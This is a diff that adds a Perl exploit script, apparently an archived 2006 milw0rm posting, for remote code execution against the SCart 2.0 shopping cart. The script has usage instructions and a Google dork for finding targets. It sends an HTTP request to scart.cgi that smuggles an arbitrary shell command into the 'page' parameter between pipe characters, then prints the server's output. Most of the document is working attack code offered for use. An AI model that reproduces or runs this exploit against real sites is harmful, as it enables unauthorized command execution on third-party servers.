@@ -1,0 +1,54 @@
+#!/usr/bin/perl
+##
+#     SCart 2.0 Remote Code Execution Exploit
+#          Bugs Found & code By K-159
+#               
+## base on advisory at http://advisories.echo.or.id/adv/adv32-K-159-2006.txt
+#   
+#  echo.or.id (c) 2006
+#
+##
+# usage:
+# perl scart.pl <target> </path/> "cmd"
+#
+# Google Dork : site: scartserver.com
+#
+# Greetz: my soul mate,echo|staff,aikmel|crew,masterpop3,SinChan,rizal,etc
+#
+# Contact: eufrato[at]gmail.com www.echo.or.id #e-c-h-o @irc.dal.net
+#
+use IO::Socket;
+use LWP::Simple;
+
+sub Usage {
+print STDERR "\n ========================================================= \r\n";
+print STDERR "      *SCart 2.0 Remote Code Execution Exploit* \r\n";
+print STDERR "                Bugs Found by K-159 \r\n";
+print STDERR "         www.echo.or.id #e-c-h-o irc.dal.net \r\n";
+print STDERR "        Usage: $0 <www.target.com> </path/> \"cmd\" \r\n";
+print STDERR "============================================================= \r\n";
+exit;
+}
+
+if (@ARGV < 3)
+{
+ Usage();
+}
+
+
+$host = @ARGV[0];
+$path = @ARGV[1];
+$command = @ARGV[2];
+
+print "\n[+] Conecting to $host\n";
+
+my $result = get("http://$host$path/scart.cgi?action=show_page&base= base2.html&page=browse.txt|$command|");
+
+if (defined $result) {
+print $result;
+}
+else {
+print "Exploit Failed.\n";
+} 
+
+# milw0rm.com [2006-06-04]
